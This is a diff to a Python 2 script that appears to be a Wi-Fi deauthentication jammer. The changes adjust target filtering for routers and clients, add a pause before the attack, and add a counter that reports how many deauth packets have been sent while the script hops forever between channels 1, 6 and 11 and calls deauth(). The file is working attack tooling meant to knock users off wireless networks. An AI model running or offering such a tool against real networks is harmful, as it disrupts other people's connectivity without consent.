@@ -184,23 +184,24 @@ if __name__ == "__main__":
 	
     print "Routers:\n" + "-----------------------------"
     for i in APs:
-		if target == "all" or target == i[2]:
+		if target == "all" or (target == i[2]):
 		    print i
     print "-----------------------------\n"
     print "Clients:\n" + "-----------------------------"
     for j in clients_APs:
-		if target == "all" or target == j[3]:
+		if target == "all" or (len(j)>=4 and target == j[3]):
 		    print j
     print "-----------------------------\n"
     
+    raw_input("Press enter to continue")
+    counter = 0
     deauth_list(target)
-    print "Deauth Packets:\n"
-    print deauth_packets_list
     
     while True:
+		print str(counter*len(deauth_packets_list)*3)+" deauth packets sent"
 		for i in [1,6,11]: #2.4 GHz Wifi Channel Numbers
+			counter = counter + 1
 			monchannel = str(i)
 			proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
 			deauth()
-        
     
